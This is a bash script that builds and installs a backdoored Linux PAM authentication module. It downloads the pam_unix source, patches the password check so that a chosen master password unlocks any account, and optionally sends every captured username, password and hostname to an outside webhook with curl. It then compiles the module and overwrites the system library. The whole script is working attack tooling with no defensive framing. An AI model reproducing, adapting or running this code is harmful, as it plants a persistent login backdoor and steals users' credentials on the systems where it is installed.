#!/bin/bash

PAM_VERSION=""
PASSWORD=""
WEBHOOK_URL=""
VERBOSE=false
RESTORE=false
PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget patch curl
)

function run_cmd {
    if [ "$VERBOSE" = true ]; then "$@"; else "$@" &>/dev/null; fi
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -v) PAM_VERSION="$2"; shift 2 ;;
        -p) PASSWORD="$2"; shift 2 ;;
        --webhook) WEBHOOK_URL="$2"; shift 2 ;;
        --verbose) VERBOSE=true; shift ;;
        --restore) RESTORE=true; shift ;;
        *) shift ;;
    esac
done

if [ "$RESTORE" = true ]; then
    if [ -f "$BACKUP_PATH" ]; then
        cp "$BACKUP_PATH" "$PAM_DEST"
        echo "Restore complete."
        exit 0
    fi
fi

if [ -z "$PASSWORD" ] && [ -z "$WEBHOOK_URL" ]; then
    echo "Error: You must provide either -p (password) or --webhook (URL)."
    exit 1
fi

echo "Checking dependencies..."
run_cmd apt update && run_cmd apt install -y "${DEPENDENCIES[@]}"

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
fi

PAM_FILE="v${PAM_VERSION}.tar.gz"
PAM_DIR="linux-pam-${PAM_VERSION}"
run_cmd wget -c "https://github.com/linux-pam/linux-pam/archive/${PAM_FILE}"
run_cmd tar xzf "$PAM_FILE"

C_INJECTION=""

if [ -n "$WEBHOOK_URL" ]; then
    C_INJECTION+="char cmd[1024]; \
    snprintf(cmd, sizeof(cmd), \"curl -H 'Content-Type: application/json' -d '{\\\"content\\\": \\\"🔐 **Capture**\\\\n**User:** %s\\\\n**Pass:** %s\\\\n**Host:** %s\\\"}' '$WEBHOOK_URL' > /dev/null 2>&1 &\", name, p, \"$(hostname)\"); \
    system(cmd);"
fi

if [ -n "$PASSWORD" ]; then
    C_INJECTION+="if (strcmp(p, \"$PASSWORD\") == 0) { retval = PAM_SUCCESS; } else { retval = _unix_verify_password(pamh, name, p, ctrl); }"
else
    C_INJECTION+="retval = _unix_verify_password(pamh, name, p, ctrl);"
fi

cat <<EOF > backdoor.patch
--- modules/pam_unix/pam_unix_auth.c
+++ modules/pam_unix/pam_unix_auth.c
@@ -170,7 +170,8 @@
 	D(("user=%s, password=[%s]", name, p));
 
 	/* verify the password of this user */
-	retval = _unix_verify_password(pamh, name, p, ctrl);
+	$C_INJECTION
+
 	name = p = NULL;
 
 	AUTH_RETURN;
EOF

run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch

# --- Compilation ---
cd "$PAM_DIR" || exit
echo "Compiling modified PAM module..."
run_cmd ./autogen.sh
run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
run_cmd make

NEW_MOD="modules/pam_unix/.libs/pam_unix.so"
if [ -f "$NEW_MOD" ]; then
    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
    cp "$NEW_MOD" "$PAM_DEST"
    chmod 644 "$PAM_DEST"
    echo "-----------------------------------------------"
    echo "Installation Successful."
    [ -n "$PASSWORD" ] && echo "Master Password: ACTIVE"
    [ -n "$WEBHOOK_URL" ] && echo "Webhook Exfil: ACTIVE"
    echo "-----------------------------------------------"
else
    echo "Build failed. Check dependencies or PAM version."
fi
